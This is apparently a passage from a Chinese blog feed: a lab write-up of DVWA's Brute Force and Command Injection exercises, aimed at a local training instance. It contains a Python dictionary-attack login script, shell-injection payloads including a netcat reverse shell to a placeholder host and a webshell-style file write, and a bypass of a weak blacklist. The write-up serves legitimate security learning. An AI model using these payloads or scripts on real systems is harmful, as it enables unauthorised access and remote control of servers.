&lt;p>扯远了。就这样吧。&lt;/p></description></item><item><title>DVWA上手记录-简单尝试</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-02/</link><pubDate>Sun, 24 Apr 2022 15:05:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-02/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。&lt;/p>
&lt;h2 id="brute-force">Brute Force&lt;/h2>
&lt;h3 id="信息收集">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469.png"
width="678"
height="310"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421165951469_hu968bfbff7b3908a335da7115c389096f_24097_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421165951469"
class="gallery-image"
data-flex-grow="218"
data-flex-basis="524px"
>&lt;/p>
&lt;p>表单很简单，尝试随便给个用户名密码会报错。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746.png"
width="293"
height="208"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170044746_hu922d70c9fe48b32784873287834092d4_5047_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170044746"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="338px"
>&lt;/p>
&lt;p>出于基本的好奇和联想（不要联想）试了下&lt;code>admin&lt;/code>和&lt;code>password&lt;/code>（就是DVWA默认的登陆密码），发现这就是正确密码了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718.png"
width="349"
height="273"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170146718_hubdd8467726ec153ca4f4cd266c83a5da_24326_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170146718"
class="gallery-image"
data-flex-grow="127"
data-flex-basis="306px"
>&lt;/p>
&lt;p>好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。&lt;/p>
&lt;p>出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288.png"
width="431"
height="198"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170531288_hu7f69ddf94bb81e659ec24c8688d64b22_14037_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170531288"
class="gallery-image"
data-flex-grow="217"
data-flex-basis="522px"
>&lt;/p>
&lt;p>再看下网络请求。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287.png"
width="1393"
height="469"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220421170720287_huc75cdf68db8e6c3f9a6464185546fd97_67655_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421170720287"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="712px"
>&lt;/p>
&lt;p>用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。&lt;/p>
&lt;h3 id="准备">准备&lt;/h3>
&lt;p>暴力破解也有暴力破解的技巧。&lt;/p>
&lt;p>可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。&lt;/p>
&lt;p>但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。&lt;/p>
&lt;p>这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。&lt;/p>
&lt;p>挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个&lt;a class="link" href="https://github.com/TgeaUs/Weak-password/" target="_blank" rel="noopener"
>Weak-password&lt;/a>（里面大部分内容不关心也用不到）直接下载 zip。&lt;/p>
&lt;p>创建个 &lt;code>dvwa-writeup&lt;/code> 仓库用来存 dvwa 题解脚本，把 zip 解压进去。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142.png"
width="291"
height="359"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422092243142_hu2c6ed95d30405302f7bb95a50c5238af_19893_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422092243142"
class="gallery-image"
data-flex-grow="81"
data-flex-basis="194px"
>&lt;/p>
&lt;p>就是这样。&lt;/p>
&lt;h3 id="编写脚本">编写脚本&lt;/h3>
&lt;p>出于个人偏好，使用 python 编写脚本。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="ch">#!/usr/bin/env python3&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># WriteUp: brute force [Security Level: Low]&lt;/span>
&lt;span class="c1"># Author: weak_ptr&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># NOTE: require python version &amp;gt;= 3.6&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;span class="n">dictionary_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s1">&amp;#39;Weak-password/Password dictionary/常用密码.dict&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;Weak-password/Password dictionary/国外常用密码.dict&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">path&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">dictionary_list&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[+] open dict: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">pwd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;http://localhost:8080/vulnerabilities/brute/?username=admin&amp;amp;password=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;amp;Login=Login#&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">cookies&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;t6kml64lvsbd8909fkrh51ove0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;security&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;low&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="c1"># 太粗暴&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[-] try password: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;Username and/or password incorrect.&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[+] Done! password is &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">repr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pwd&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">continue&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行后：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[+] open dict: Weak-password/Password dictionary/常用密码.dict
[-] try password: admin
[-] try password: admin12
[-] try password: admin888
[-] try password: admin8
[-] try password: admin123
[-] try password: sysadmin
[-] try password: adminxxx
[-] try password: adminx
[-] try password: 6kadmin
[-] try password: base
[-] try password: feitium
[-] try password: admins
[-] try password: root
[-] try password: roots
[-] try password: test
[-] try password: test1
[-] try password: test123
[-] try password: test2
[-] try password: password
[+] Done! password is &amp;#39;password&amp;#39;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>值得注意的是不清楚是不是因为我跑在容器里而且虚拟机只分配了 2C 1G 的缘故，每次尝试密码耗时都接近 1s。放在真实场景下，服务端如果限制了请求频率（或者把每个请求都用固定时间返回，如 1s），破解成本会骤然提高（不过对服务器来说固定返回时间也是有不低的成本的）。&lt;/p>
&lt;h3 id="提高难度">提高难度&lt;/h3>
&lt;p>尝试把安全等级提高到 Medium 和 High 对暴力破解并没有什么用，不清楚是不是因为虚拟机太慢，单线程爆破没触发频率限制。但总之是和 Low 难度下没什么区别。&lt;/p>
&lt;p>提高到 Impossible ，开启 PHPIDS 也无济于事。&lt;/p>
&lt;p>可见系统设计再安全也顶不住人为因素，保险箱钥匙放在地毯下面的时候就算保险箱是振金做的也防不住贼啊。&lt;/p>
&lt;h2 id="command-injection">Command Injection&lt;/h2>
&lt;h3 id="信息收集-1">信息收集&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288.png"
width="690"
height="270"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101128288_hudbc3e0ef08e95f39b0817c51ecb3343a_23969_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101128288"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="613px"
>&lt;/p>
&lt;p>介绍是 ping a device，尝试输入 localhost 提交：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860.png"
width="669"
height="389"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101215860_hu73799ffa0ce1f097b18a79596df7ca58_29483_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101215860"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="412px"
>&lt;/p>
&lt;p>应该是执行了 &lt;code>ping -c 4 &amp;lt;用户输入&amp;gt;&lt;/code>。尝试随便输入什么东西会不会报错。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634.png"
width="673"
height="263"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101354634_hu858a6ebf2ce93a4713cb7043282bcd66_24133_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101354634"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="614px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231.png"
width="689"
height="283"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101405231_hua6af44221cab3062ad11653bd178989c_24076_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101405231"
class="gallery-image"
data-flex-grow="243"
data-flex-basis="584px"
>&lt;/p>
&lt;p>立刻返回了，什么也没发生。再尝试拼一个命令进去：&lt;code>localhost &amp;amp;&amp;amp; echo 123&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861.png"
width="679"
height="411"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422101538861_hu8cdc8bc306ca76b2f4e643fe09f8e1bb_29778_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422101538861"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>注意到末尾输出了 123，说明存在命令执行。&lt;/p>
&lt;h3 id="准备-1">准备&lt;/h3>
&lt;p>能执行任意命令的话，悬念就不大了，进可攻退可守。&lt;/p>
&lt;p>对 &lt;code>/var/www/html&lt;/code> 有写权限的话可以直接写个一句话木马，或者通过 &lt;code>nc&lt;/code> 命令反弹 shell。&lt;/p>
&lt;p>顺便一体 nc 反弹 shell 我并不会（手动狗头）。所以还得先学一学怎么用 nc 反弹 shell，到底啥原理。&lt;/p>
&lt;p>先 &lt;code>man nc&lt;/code> 看看手册。&lt;/p>
&lt;blockquote>
&lt;p>NAME&lt;/p>
&lt;p>​ nc - TCP/IP swiss army knife&lt;/p>
&lt;p>SYNOPSIS&lt;/p>
&lt;p>​ nc [-options] hostname port[s] [ports] &amp;hellip;&lt;/p>
&lt;p>​ nc -l -p port [-options] [hostname] [port]&lt;/p>
&lt;/blockquote>
&lt;p>嘶&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>TCP/IP 瑞士军刀诶。&lt;/p>
&lt;blockquote>
&lt;p>netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable &amp;ldquo;back-end&amp;rdquo; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or &amp;ldquo;nc&amp;rdquo; as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.&lt;/p>
&lt;/blockquote>
&lt;p>netcat（我就管它叫网猫了），看介绍是一个可以被其他程序或者脚本驱动的“后端”工具，也是网络调试和探索工具，能创建几乎所有类型的连接。这么说感觉还有点迷惑，看后文介绍就清楚多了。&lt;/p>
&lt;blockquote>
&lt;p>In the simplest usage, &amp;ldquo;nc host port&amp;rdquo; creates a TCP connection to the given port on the given target host. Your standard input is then sent to the host, and anything that comes back across the connection is sent to your standard output. This continues indefinitely, until the network side of the connection shuts down. Note that this behavior is different from most other applications which shut everything down and exit after an end-of-file on the standard input.&lt;/p>
&lt;p>Netcat can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. With minor limitations, netcat doesn&amp;rsquo;t really care if it runs in &amp;ldquo;client&amp;rdquo; or &amp;ldquo;server&amp;rdquo; mode &amp;ndash; it still shovels data back and forth until there isn&amp;rsquo;t any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side.&lt;/p>
&lt;/blockquote>
&lt;p>概括下值得关注的部分，就是网猫的两种工作模式。客户端模式下把 stdin 用连接转发，同时把收到的消息写到 stdout；服务器模式监听端口，同样转发 stdin 并把收到的消息写到 stdout 。&lt;/p>
&lt;p>剩下比较重要的就是几个命令行选项：&lt;/p>
&lt;ul>
&lt;li>&lt;code>-l&lt;/code> 指示网猫在服务器模式下工作，监听一个指定端口。&lt;/li>
&lt;li>&lt;code>-e&lt;/code> 指示网猫在连接后运行一个程序，程序的输入会变成从连接收到的信息，程序的输出会从连接发送出去。&lt;/li>
&lt;li>&lt;code>-s&lt;/code> 指示网猫监听的本地地址。&lt;/li>
&lt;/ul>
&lt;p>可以做个简单的实验熟悉下命令的使用，用 tmux 按 &lt;code>ctrl+b&lt;/code> &lt;code>&amp;quot;&lt;/code> &lt;code>ctrl+b&lt;/code> &lt;code>%&lt;/code> 切分两个窗口出来，一边执行 &lt;code>nc -l -s 0.0.0.0 -p 12345&lt;/code> 另一边执行 &lt;code>nc localhost 12345&lt;/code>。&lt;/p>
&lt;p>在执行 &lt;code>nc localhost 12345&lt;/code> 的这边网猫工作在客户端模式下，可以自由尝试在两边键盘输入什么东西，另一边都会实时回显：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970.png"
width="1253"
height="110"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422134806970_hue4c2b6d980755bce46f80b71b58199b9_168449_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422134806970"
class="gallery-image"
data-flex-grow="1139"
data-flex-basis="2733px"
>&lt;/p>
&lt;p>现在解释网猫反向shell就很简单了，用 &lt;code>nc localhost 12345 -e /bin/sh&lt;/code> 连接服务器，此时 &lt;code>/bin/sh&lt;/code> 的输入输出被接管，我们在服务端输入 &lt;code>ls&lt;/code>，客户端的 &lt;code>/bin/sh&lt;/code> 读到的输入就是 &lt;code>ls&lt;/code>，&lt;code>/bin/sh&lt;/code> 执行 &lt;code>ls&lt;/code> 的结果又返回到服务端——&lt;code>nc&lt;/code>客户端就成了一个类似sshd的角色，故称反向连接。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963.png"
width="799"
height="204"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135301963_hu5f0c0379ce9d698f046ca7a92259ac1e_234796_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422135301963"
class="gallery-image"
data-flex-grow="391"
data-flex-basis="940px"
>&lt;/p>
&lt;h3 id="构造-payload">构造 payload&lt;/h3>
&lt;p>先尝试用网猫反向连接。输入内容改成 &lt;code>localhost &amp;amp;&amp;amp; nc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; -e /bin/sh &amp;amp;&lt;/code> ，等待连接。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026.png"
width="341"
height="41"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422135847026_hu8aca9c9f3b1ddcde7b50574d9ad5b6e8_10075_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422135847026"
class="gallery-image"
data-flex-grow="831"
data-flex-basis="1996px"
>&lt;/p>
&lt;p>没成功。网页显示 ping 命令的输出，看了眼 dvwa 容器的日志发现提示没有&lt;code>nc&lt;/code>命令。&lt;/p>
&lt;p>好吧，上面那么多话到最后还是没有屁用。那就改成提交一个 php 一句话。输入内容改为 &lt;code>localhost &amp;amp;&amp;amp; echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; /var/www/html/1.php&lt;/code>，然后访问 &lt;code>http://localhost:8080/1.php&lt;/code>，发现成功显示 phpinfo，done。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861.png"
width="1248"
height="366"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422140459588-16506075001861_hu3476fd340cc0dbca84661fbd196275c9_38452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422140459588"
class="gallery-image"
data-flex-grow="340"
data-flex-basis="818px"
>&lt;/p>
&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
&lt;p>在 Medium 难度下 直接注入 &lt;code>localhost &amp;amp;&amp;amp; echo 123&lt;/code> 会发现没有 &lt;code>123&lt;/code> 回显了，日志里出现 &lt;code>ping: unknown host&lt;/code> 的错误，初步怀疑是对 &lt;code>&amp;amp;&amp;amp;&lt;/code> 做了过滤。&lt;/p>
&lt;p>DVWA 是个白盒，我也不用瞎试，直接点开 view source 审计下代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Determine OS and execute the ping command.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stristr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">php_uname&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s1">&amp;#39;Windows NT&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Windows
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// *nix
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$cmd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Feedback for the end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到把 &lt;code>&amp;amp;&amp;amp;&lt;/code> 和 &lt;code>;&lt;/code> 去除了，但这个过滤显然是不完善的。起码我一下子就能想到还可以&lt;code>||&lt;/code>或者&lt;code>|&lt;/code>，还有&lt;code>$()&lt;/code>之类的方式。&lt;/p>
&lt;p>把先前的 payload 改成 &lt;code>notexists || echo 123&lt;/code> 再提交。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236.png"
width="674"
height="140"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422153010236_hu4c2f178bd8960d6bc4449f63040b6b19_5338_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422153010236"
class="gallery-image"
data-flex-grow="481"
data-flex-basis="1155px"
>&lt;/p>
